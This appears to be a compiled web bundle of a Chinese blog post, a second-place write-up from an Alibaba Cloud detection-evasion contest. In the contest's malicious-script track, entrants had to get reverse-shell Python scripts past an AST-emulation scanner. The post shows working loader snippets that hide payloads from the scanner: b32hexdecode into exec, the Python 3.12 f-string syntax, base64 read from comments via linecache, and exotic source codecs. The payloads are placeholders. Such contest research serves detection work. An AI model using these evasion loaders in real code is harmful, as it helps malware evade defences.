import{_ as s,o as n,c as a,e}from"./app-vMCaIZpZ.js";const t="/assets/Pasted_image_20240411114002-aQqS7s1e.png",p="/assets/Pasted_image_20240411114434-Oq0oJ58k.png",o="/assets/Pasted_image_20240412151746-JY_sOicz.png",i="/assets/Pasted_image_20240412152105-pLgwjujk.png",c="/assets/Pasted_image_20240415103631-qoQnIRs5.png",l="/assets/Pasted_image_20240425102423-4-NoS-P2.png",d="/assets/Pasted_image_20240425103512-j8lYHk-t.png",u="/assets/Pasted_image_20240425103528--ii9xi1w.png",r="/assets/Pasted_image_20240425103603-bjO58SF1.png",m="/assets/Pasted_image_20240425103730-cXHxWJXQ.png",_={},k=e('<h1 id="阿里云伏魔挑战赛第三期恶意脚本赛道总结" tabindex="-1"><a class="header-anchor" href="#阿里云伏魔挑战赛第三期恶意脚本赛道总结" aria-hidden="true">#</a> 阿里云伏魔挑战赛第三期恶意脚本赛道总结</h1><p>本次主要参加的是恶意脚本赛道，恶意脚本分为两类，Bash和Python，目标是实现反弹shell。本文重点为python恶意脚本脚本绕过。本次获得的是第二名成绩。</p><blockquote><p>比赛规则：https://www.yuque.com/azeus/01/ip4w17t9w5riu4sw</p></blockquote><p>本着知己知彼的思想，向审核大大请教了一下检测引擎工作原理</p><p><img src="'+t+'" alt=""> https://conference.hitb.org/hitbsecconf2022sin/materials/D2%20COMMSEC%20-%20Best%20Practices%20For%20Simulating%20Execution%20in%20Malicious%20Text%20Detection%20-%20Shuo%20Wang%20&amp;%20Yi%20Sun.pdf</p><p>其中我认为动态仿真引擎比较关键，把语言解析为AST抽象语法树，放到虚拟机中进行模拟执行</p><p><img src="'+p+`" alt=""></p><h2 id="built-in-函数绕过" tabindex="-1"><a class="header-anchor" href="#built-in-函数绕过" aria-hidden="true">#</a> Built-in 函数绕过</h2><p>动态执行引擎内部有很多 Built-in 的类和函数。如果存在一些类或函数引擎没有覆盖到，那么也可以绕过检测。</p><p>例如 Python 3.10 版本中引入的新的 <code>b32hexdecode</code> 函数，解码后传入到exec函数执行任意python代码</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> base64  
  
a <span class="token operator">=</span> base64<span class="token punctuation">.</span>b32hexdecode<span class="token punctuation">(</span>  
    <span class="token string">&quot;[base32_eval_python_code]&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>  
<span class="token keyword">exec</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>当时比较尴尬的是python环境不干净，搜到很多第三方依赖的包的一些eval函数，提交的报告不符合规则，所以就没有通过。</p></blockquote><h2 id="新版语言特性绕过" tabindex="-1"><a class="header-anchor" href="#新版语言特性绕过" aria-hidden="true">#</a> 新版语言特性绕过</h2><p>模拟引擎可能有些存在一些语言特性没有囊括在内，导致引擎分析失败。</p><p>例如Python 3.12特性，f-string中可以使用相同引号，而在之前版本是会报错的 https://docs.python.org/3.12/whatsnew/3.12.html#pep-701-syntactic-formalization-of-f-strings <img src="`+o+'" alt=""></p><p><img src="'+i+`" alt=""></p><p>构造如下恶意脚本，即可绕过检测，使用exec函数来执行任意python代码</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;payload_frag1&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;payload_frag2&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;payload_frag3&#39;</span><span class="token punctuation">]</span>
code <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;{&quot;</span></span><span class="token punctuation">,</span> <span class="token string">&quot;.join(payload)}payload_frag4&quot;</span>
code <span class="token operator">=</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">&quot;base64&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="注释绕过" tabindex="-1"><a class="header-anchor" href="#注释绕过" aria-hidden="true">#</a> 注释绕过</h2><p>既然会解析成AST，那么会对注释进行忽略，从而隐藏 taint source 那么就可以从注释中获取payload</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> base64  
<span class="token comment"># [eval_base64_python_code]</span>
<span class="token keyword">import</span> linecache  
  
content <span class="token operator">=</span> linecache<span class="token punctuation">.</span>getline<span class="token punctuation">(</span><span class="token string">&#39;read_current_file.py&#39;</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>  
code <span class="token operator">=</span> content<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  
code <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>  
<span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="编码绕过" tabindex="-1"><a class="header-anchor" href="#编码绕过" aria-hidden="true">#</a> 编码绕过</h2><p>通过python的解析过程入手，从开始实现降维打击</p><p><img src="`+c+'" alt=""></p><p>编码让我想起了 https://ti.aliyun.com/#/log?id=28 这篇文章，利用使用jsp的编码格式实现的webshell免杀降维打击</p><p>通过codec模块生成各种 python 支持的编码进行 fuzz <img src="'+l+'" alt=""></p><p>中间需要做一些处理，过滤和utf8兼容的编码格式，剔除掉仍然显示为明文的编码。 <img src="'+d+'" alt=""></p><p>运行生成了13种编码符合要求的编码 <img src="'+u+'" alt=""></p><p>然后需要判断脚本是否能正常运行</p><p><img src="'+r+`" alt=""> 能够正常运行的有7种编码</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[&#39;cp875_test.py&#39;, &#39;cp1140_test.py&#39;, &#39;cp037_test.py&#39;, &#39;cp424_test.py&#39;, &#39;cp500_test.py&#39;, &#39;cp1026_test.py&#39;, &#39;cp273_test.py&#39;]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>手动测试，可以正常运行 <img src="`+m+'" alt=""></p>',32),h=[k];function g(b,v){return n(),a("div",null,h)}const f=s(_,[["render",g],["__file","aliyunfumotaozhansaidisanqieyijiaobensaidaozongjie.html.vue"]]);export{f as default};
